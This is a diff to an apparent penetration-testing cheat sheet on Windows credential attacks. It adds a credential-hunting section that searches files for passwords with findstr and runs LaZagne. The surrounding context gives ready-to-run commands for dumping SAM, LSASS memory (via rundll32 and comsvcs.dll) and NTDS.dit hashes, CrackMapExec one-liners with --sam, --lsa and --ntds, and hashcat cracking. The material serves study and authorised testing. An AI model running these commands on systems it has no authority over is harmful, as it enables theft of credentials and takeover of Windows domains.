@@ -1,10 +1,12 @@
 ### Content
 - [Transfer Files Technique](#transfer-files-technique)
 - [Hash Crack Technique](#hash-crack-technique)
+- [Credential Hunting](#credential-hunting)
 - [Local Attacks](#local-attacks)
 	- [SAM Attacks](#sam-attacks)
 	- [LSASS Attacks](#lsass-attacks)
 	- [Active Directory & NTDS.dit Attacks](#active-directory-&-ntds.dit-attacks)
+- 
 ---
 ##### Transfer Files Technique
 Transfer files from the target to the attacker machine using [Impacket's smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py).
@@ -24,6 +26,21 @@ Crack hashes with hashcat. [supported hash types](https://hashcat.net/wiki/doku.
 	``` bash
 	sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
 	```
+---
+##### Credential Hunting
+Once we have access to a target, we can hunt stored credentials stored on it.
+- Key Terms to Search: Passwords, Passphrases, Keys, Username, User account, Creds, Users, Passkeys, Passphrases, configuration, dbcredential, dbpassword, pwd, Login, Credentials. using findstr:
+	``` Powershell
+	findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+	```
+- We can transfer [Lazagne](https://github.com/AlessandroZ/LaZagne/releases/) to the target host, using the [Transfer Files Technique](#transfer-files-technique) discussed above then run it with the next command
+	``` CMD
+	C:\> start lazagne.exe all
+	```
+- Other places we should keep in mind when credential hunting:
+	- Group Policy and scripts in the SYSVOL share.
+	- Look at IT shares.
+	- Passwords in the AD user or computer description fields.
 ---
 # Local Attacks
 ## SAM Attacks
@@ -46,12 +63,14 @@ Dumping the local SAM database from a compromised host. **Local admin privileges
 - Use [Hash Crack Technique](#hash-crack-technique) mentioned above to crack the dumped hashes.
 
 > [!Note]
-> CrackMapExec to accomplish the same steps shown above, all with one command.
+> CrackMapExec can accomplish the same steps shown above, all with one command.
 > `crackmapexec smb <IP> --local-auth -u <UserName> -p <Password> --sam`
 ## LSASS Attacks
 Pulling hashes from memory by dumping the `lsass.exe` process memory.
 - In case we have UI access, dump the process memory using the task manager. `lsass.DMP` file created in `C:\Users\loggedonusersdirectory\AppData\Local\Temp`
+
 <img src="https://private-user-images.githubusercontent.com/115187674/394169491-6912e7fd-d4d8-4790-81d4-f6927060a68c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzM4MTYxNTMsIm5iZiI6MTczMzgxNTg1MywicGF0aCI6Ii8xMTUxODc2NzQvMzk0MTY5NDkxLTY5MTJlN2ZkLWQ0ZDgtNDc5MC04MWQ0LWY2OTI3MDYwYTY4Yy5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQxMjEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MTIxMFQwNzMwNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1iZTM3ZTQ5NDFjYjU4ZWM4NDRjMTdmNmZhNThkNmRiNDJjNTI2NzRhMjU2NGNlZjk5NjAxNzM1NzI5NDg4MjI0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.My2LUJTdvLPIvItX8iuo6loG0BIVgQtRxY0R6h_QhKw">
+
 - In case we have only command-line access, use [Rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32) & Comsvcs.dll.
 	- Find the process PID with `tasklist | findstr lsass.exe`
 	``` PowerShell
@@ -65,7 +84,7 @@ Pulling hashes from memory by dumping the `lsass.exe` process memory.
 - Use [Hash Crack Technique](#hash-crack-technique) mentioned above to crack the dumped hashes.
 
 > [!Note]
-> CrackMapExec to accomplish the same steps shown above, all with one command.
+> CrackMapExec can accomplish the same steps shown above, all with one command.
 > `crackmapexec smb <IP> --local-auth -u <Username> -p <Password> --lsa`
 ## Active Directory & NTDS.dit Attacks
 Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
@@ -111,5 +130,8 @@ PS> ESENTUTL /p 'NTDS.dit' /!10240 /8 /o
 - Use [Hash Crack Technique](#hash-crack-technique) mentioned above to crack the dumped hashes.
 
 > [!Note]
-> CrackMapExec to accomplish the same steps shown above, all with one command.
+> CrackMapExec can accomplish the same steps shown above, all with one command.
 > `crackmapexec smb <IP> -u <UserName> -p <Password> --ntds`
+
+---
+# Lateral Movement
